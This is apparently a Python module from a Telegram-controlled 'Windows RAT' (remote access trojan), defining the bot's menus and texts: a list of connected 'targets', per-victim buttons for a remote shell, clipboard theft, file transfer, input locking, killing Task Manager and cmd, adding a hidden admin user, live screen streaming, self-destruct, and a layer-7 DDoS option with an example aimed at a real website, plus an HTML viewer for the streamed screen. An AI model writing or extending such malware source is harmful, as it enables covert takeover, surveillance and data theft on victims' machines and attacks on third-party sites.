from telethon import Button

LIST_TEXT = '''╔══════════════════╗
     ʟɪsᴛ ᴏғ ᴀʟʟ ᴏɴʟɪɴᴇ ᴛᴀʀɢᴇᴛs 
     ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴛᴏ ᴡᴇʙsᴏᴄᴋᴇᴛ   
╚══════════════════╝'''

HOME_TEXT = '''╔════════★═════════╗
      ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ YourName 
               ᴡɪɴᴅᴏᴡs ʀᴀᴛ   
╚══════════════════╝'''

HOME_BUTTON = [
    [Button.inline("Oɴʟɪɴᴇ Tᴀʀɢᴇᴛs","GetOnlineRequest"),Button.inline("Dᴏ Cᴏᴍᴍᴀɴᴅ ᴏɴ ᴀʟʟ")],
    [Button.inline("Sᴇʟғ Dᴇsᴛʀᴏʏ"),Button.inline("ᴅᴅᴏs ᴡɪᴛʜ ᴀʟʟ","ddoswithall")],
    [Button.inline("Sᴇᴛᴛɪɴɢs")]
]

BACK_BUTTON = [Button.inline("ʙᴀᴄᴋ","back")]
TG_CONTROL_TEXT = '''╔══════════════════╗
        ᴛᴀʀɢᴇᴛ ᴄᴏɴᴛʀᴏʟ ᴘᴀɴᴇʟ   
╚══════════════════╝'''


def getControl(ip):
    return [
            [Button.inline("sʜᴇʟʟ",f"shellexec-{ip}"),Button.inline("ᴛᴀʀɢᴇᴛ ɪɴғᴏ",f"tginforeq-{ip}")],
            [Button.inline("ɢᴇᴛ ᴄʟɪᴘʙᴏᴀʀᴅ",f"getclipboardreq-{ip}"),Button.inline("sᴇᴛ ᴄʟɪᴘʙᴏᴀʀᴅ",f"setclipboard-{ip}")],
            [Button.inline("ᴛᴀsᴋᴍɢʀ ᴋɪʟʟᴇʀ ᴏɴ",f"tskmgrkillon-{ip}"),Button.inline("ᴛᴀsᴋᴍɢʀ ᴋɪʟʟᴇʀ ᴏғғ",f"tskmgrkilloff-{ip}")],
            [Button.inline("Cᴍᴅ ᴋɪʟʟᴇʀ ᴏɴ",f"cmdkillon-{ip}"),Button.inline("Cᴍᴅ ᴋɪʟʟᴇʀ ᴏғғ",f"cmdkilloff-{ip}"),],
            [Button.inline("ᴜᴘʟᴏᴀᴅ ғɪʟᴇ",f"upload-{ip}"),Button.inline("ᴅᴏᴡɴʟᴏᴀᴅ ғɪʟᴇ",f"download-{ip}")],
            [Button.inline("ʟᴏᴄᴋ ɪɴᴘᴜᴛ",f"lockinput-{ip}"),Button.inline("ᴜɴʟᴏᴄᴋ ɪɴᴘᴜᴛ",f"unlockinput-{ip}")],
            [Button.inline("Sᴇʟғ Dᴇsᴛʀᴏʏ",f"selfdestroy-{ip}"),Button.inline("ʟ7 ᴅᴅᴏs ᴀᴛᴛᴀᴄᴋ",f"ddos-{ip}")],
            [Button.inline("ᴀᴅᴅ ʜɪᴅᴅᴇɴ ᴀᴅᴍɪɴ ᴜsᴇʀ",f"addfulluser-{ip}"),Button.inline("ᴅᴇʟᴇᴛᴇ ᴜsᴇʀ",f"deleteuser-{ip}")],
            [Button.inline("sᴛʀᴇᴀᴍ ᴛᴀʀɢᴇᴛ ᴏɴ",f"stramtgon-{ip}"),Button.inline("sᴛʀᴇᴀᴍ ᴛᴀʀɢᴇᴛ ᴏғғ",f"stramtgoff-{ip}")],
            BACK_BUTTON
        ]

DDOS_TEXT = '''Sᴇɴᴅ ʏᴏᴜʀ ᴅᴅᴏs ᴛᴀʀɢᴇᴛ ʟɪᴋᴇ ᴛʜɪs

url time thread 

ᴇxᴀᴍᴘʟᴇ:

https://google.com/ 120 100'''


RAT_DESTROYED = '''Rᴀᴛ Dᴇsᴛʀᴏʏᴇᴅ ᴏɴ ᴛᴀʀɢᴇᴛ sᴜᴄᴄᴇssғᴜʟʟʏ .✅

ᴛʜɪs ᴛᴀʀɢᴇᴛ ɪs ɴᴏ ʟᴏɴɢᴇʀ ᴀᴠᴀɪʟᴀʙʟᴇ.'''


FULL_HTML_TEXT = '''
<!DOCTYPE html>
<html>
<head>
 <title>Viewer</title>
 <script>
    setInterval(function() {
        var ws = new WebSocket("ws://thiswillChange/");
        ws.onopen = function() {
        console.log("WebSocket connection established.");
        };

        ws.onmessage = function(e) {
        var imageBytes = e.data;
        var blob = new Blob([imageBytes], {type: "image/jpeg"});
        var imageUrl = URL.createObjectURL(blob);
        document.getElementById("image").src = imageUrl;
        };

        ws.onclose = function() {
        console.log("WebSocket connection closed.");
        };
   }, 500);
  
  
 </script>
</head>
<body>
 <img id="image" />
</body>
</html>'''


ADD_USER = '''🌀 ᴇɴᴛᴇʀ ᴜsᴇʀ ᴛᴏ ᴀᴅᴅ:

ᴇxᴀᴍᴘʟᴇ : 

<user> <password>
username1 rat123456'''